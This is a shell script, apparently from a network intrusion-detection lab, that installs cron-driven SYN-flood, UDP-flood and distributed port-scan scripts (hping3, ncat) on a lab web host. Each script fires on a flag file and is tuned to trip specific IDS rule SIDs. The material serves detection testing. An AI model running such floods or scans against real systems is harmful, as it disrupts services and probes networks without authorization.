#!/bin/sh
# Yatesbury attacker scripts — Alpine-1 WEB host (10.1.100.10)
# Paste-friendly: copy entire content + paste vào console telnet :5008.
# Role: contributor in distributed attacks (DDoS, dist scan).

set -e

echo "=== [yates/web] Installing attacker scripts on WEB (10.1.100.10) ==="

apk update 2>&1 | tail -3
apk add --no-cache hping3 ncat nmap 2>&1 | tail -3 || true

# ─────────────────────────────────────────────────────────────────────────
# yates-synddos.sh — SYN DDoS contributor (SID 9000044)
# Triggered jointly with APP's synflood for multi-source attack
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-synddos.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-synddos ] || exit 0
logger -t "yates-synddos" "SYN DDoS contribution WEB->DB:5432"
# Lower rate per source — 50+ SYN per src_dst pair in 10s for SID 9000044
timeout 15 hping3 -S -p 5432 -i u20000 -q 10.1.200.10 2>/dev/null || true
SCRIPT
chmod +x /usr/local/bin/yates-synddos.sh

# ─────────────────────────────────────────────────────────────────────────
# yates-udpddos.sh — UDP DDoS contributor (SID 9000045)
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-udpddos.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-udpddos ] || exit 0
logger -t "yates-udpddos" "UDP DDoS WEB->DB:53"
# UDP flood targeting one dst (track by_dst threshold 500/10s)
timeout 15 hping3 --udp -p 53 --flood -q 10.1.200.10 2>/dev/null || true
SCRIPT
chmod +x /usr/local/bin/yates-udpddos.sh

# ─────────────────────────────────────────────────────────────────────────
# yates-distscan.sh — distributed TCP port scan (SID 9000041)
# WEB contributes by probing key service ports across multiple hosts
# ─────────────────────────────────────────────────────────────────────────
cat > /usr/local/bin/yates-distscan.sh <<'SCRIPT'
#!/bin/sh
[ -f /tmp/compromised-yates-distscan ] || exit 0
logger -t "yates-distscan" "distributed scan WEB-side starting"
# Probe key service ports on multiple hosts — fires SID 9000041 (5/60s by_src)
for h in 10.1.200.10 10.2.100.10 10.2.50.10; do
  for p in 22 80 443 3306 5432 8080; do
    timeout 1 ncat -zv $h $p 2>/dev/null || true
  done
done
SCRIPT
chmod +x /usr/local/bin/yates-distscan.sh

# ─────────────────────────────────────────────────────────────────────────
# Cron entries
# ─────────────────────────────────────────────────────────────────────────
sed -i '/yates-/d' /etc/crontabs/root 2>/dev/null || true

cat >> /etc/crontabs/root <<'CRON'
* * * * * /usr/local/bin/yates-synddos.sh
* * * * * /usr/local/bin/yates-udpddos.sh
* * * * * /usr/local/bin/yates-distscan.sh
CRON

rc-service crond restart 2>&1 | tail -3 || /etc/init.d/crond reload 2>/dev/null || true

echo
echo "=== Installed scripts ==="
ls -la /usr/local/bin/yates-*.sh
echo
echo "=== Cron entries ==="
grep yates /etc/crontabs/root
echo
echo "=== DONE: WEB yatesbury contributor scripts installed ==="
echo "Trigger by touching flag files from MGT scenario controllers:"
echo "  /tmp/compromised-yates-synddos"
echo "  /tmp/compromised-yates-udpddos"
echo "  /tmp/compromised-yates-distscan"
